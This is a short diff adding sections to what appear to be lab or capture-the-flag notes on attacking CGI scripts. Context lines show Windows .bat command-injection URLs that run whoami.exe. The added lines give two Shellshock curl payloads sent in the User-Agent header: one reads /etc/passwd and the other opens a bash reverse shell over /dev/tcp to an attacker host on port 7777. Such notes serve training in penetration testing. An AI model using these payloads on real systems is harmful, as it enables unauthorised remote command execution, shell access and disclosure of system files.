@@ -91,3 +91,14 @@ http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
 http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
 
+### Confirming the Vulnerability
+
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+### Exploitation to Reverse Shell Access
+
+```
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
